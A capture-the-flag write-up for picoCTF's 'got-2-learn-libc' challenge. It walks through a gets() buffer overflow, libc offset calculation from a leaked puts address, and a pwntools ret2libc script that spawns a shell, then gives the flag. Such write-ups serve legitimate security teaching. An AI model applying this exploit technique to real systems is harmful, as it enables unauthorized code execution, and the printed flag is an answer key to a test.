> got-2-learn-libc - Points: 250 - (Solves: 7)
> This program gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee on the shell server. Source.

From the title this seems to be a ret-2-libc exploit.

The program takes input to a fixed size buffer of 148 bytes. The input is taken from the `gets` function which takes arbitrary length input.

This mean we can overflow the buffer and overwrite the return address.

From the leaked address we can find out the offset for `system` and use that to get a shell.

We use `https://libc.blukat.me/?q=fflush%3A0xf7608330%2Cputs%3A0xf760a140&l=libc6-i386_2.23-0ubuntu10_amd64` to get the offsets to `/bin/sh`.

We use the puts address and calculate the addresses to `system` and `str_bin_sh` from there.

The offsets from puts are:
- system: -0x24800
- str_bin_sh: 0xf9eeb

Using pwntools we can easily create a script to do that for us.

Playing around a bit with the offset.

We finally find the right offset which is 160.

Our exploit script:

```python
from pwn import *

p = process("/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln")

p.recvuntil("puts: ")

puts_ad = int(p.recvline().strip(), 16)
system = puts_ad -0x24800
binsh = puts_ad + 0xf9eeb

offset = 160

p.sendline('A'*offset + p32(system) * 2 + p32(binsh))

p.interactive()
```

This gives us a shell and we can simply `cat flag.txt` to get the flag.

Flag: `picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}`
